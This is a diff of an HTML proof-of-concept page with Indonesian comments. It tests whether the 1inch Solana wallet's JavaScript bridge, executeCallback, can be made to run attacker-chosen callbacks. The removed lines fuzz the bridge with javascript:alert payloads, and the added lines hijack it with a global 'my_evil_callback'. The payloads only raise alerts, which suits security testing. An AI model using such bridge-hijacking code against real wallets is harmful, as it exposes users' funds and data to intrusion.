@@ -1,33 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>Fuzzing executeCallback...</h3>
-    <div id="status">Menjalankan percobaan...</div>
+    <h3>🎯 Final Test: Callback Hijacking</h3>
+    <div id="logs"></div>
 
     <script>
-        const target = window.OneInchSolanaWallet;
-        const msg = (t) => document.getElementById('status').innerText = t;
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
+        
+        // 1. Kita buat fungsi jebakan di window global
+        window.my_evil_callback = function(data) {
+            alert("BOOM! UXSS Berhasil via Callback Hijacking!\nData diterima: " + JSON.stringify(data));
+        };
 
-        if (target && target.executeCallback) {
+        const Bridge = window.OneInchSolanaWallet;
+
+        if (Bridge && Bridge.executeCallback) {
+            log("Mencoba memicu callback 'my_evil_callback'...");
+
             try {
-                // Mencoba berbagai variasi payload yang sering tembus di bridge mobile
-                const payloads = [
-                    { id: "1", data: { result: "alert('UXSS_1')" } },
-                    { id: "javascript:alert('UXSS_2')", data: {} },
-                    { id: "1", data: "alert('UXSS_3')" }
-                ];
-
-                payloads.forEach(p => {
-                    // Coba panggil dengan parameter id dan data
-                    target.executeCallback(p.id, p.data);
-                });
+                // 2. Kita suruh bridge mengeksekusi fungsi jebakan kita
+                // Parameter 1: Nama fungsi (ID)
+                // Parameter 2: Data yang dikirim ke fungsi tersebut
+                Bridge.executeCallback("my_evil_callback", { status: "pwned", balance: "9999 ETH" });
                 
-                msg("Payload terkirim. Cek apakah ada pop-up.");
+                log("Perintah dikirim. Jika muncul alert, dompet ini VULNERABLE.");
             } catch(e) {
-                msg("Error: " + e.message);
+                log("Gagal memicu callback: " + e.message);
             }
         } else {
-            msg("Fungsi executeCallback tidak ditemukan.");
+            log("Bridge tidak ditemukan.");
         }
     </script>
 </body>
